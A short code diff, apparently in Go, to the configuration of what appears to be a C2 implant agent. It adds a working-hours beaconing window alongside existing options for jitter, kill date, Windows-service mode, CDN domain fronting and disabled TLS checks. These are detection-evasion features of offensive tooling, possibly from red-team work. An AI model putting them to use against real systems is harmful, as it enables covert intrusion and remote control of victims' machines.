@@ -9,10 +9,11 @@ var (
 	ListenerURL   = "https://127.0.0.1:443"
 	SleepSeconds  = "10"
 	JitterPercent = "20"
-	KillDate      = ""          // Optional: YYYY-MM-DD format, agent self-terminates after this date
-	ServerPubKey  = ""          // Base64-encoded RSA public key (embedded at compile time)
-	RunAsService  = ""          // Set to "true" to run as Windows service
-	FrontDomain   = ""          // CDN domain for SNI-based domain fronting (e.g., "cdn.microsoft.com")
-	HostHeader    = ""          // Override HTTP Host header for domain fronting (e.g., "c2.workers.dev")
-	TLSInsecure   = ""          // Set "true" to disable TLS cert verification (self-signed C2)
+	KillDate      = "" // Optional: YYYY-MM-DD format, agent self-terminates after this date
+	WorkingTime   = "" // Optional: "HH:MM-HH:MM" (24h) — agent only beacons within this window
+	ServerPubKey  = "" // Base64-encoded RSA public key (embedded at compile time)
+	RunAsService  = "" // Set to "true" to run as Windows service
+	FrontDomain   = "" // CDN domain for SNI-based domain fronting (e.g., "cdn.microsoft.com")
+	HostHeader    = "" // Override HTTP Host header for domain fronting (e.g., "c2.workers.dev")
+	TLSInsecure   = "" // Set "true" to disable TLS cert verification (self-signed C2)
 )
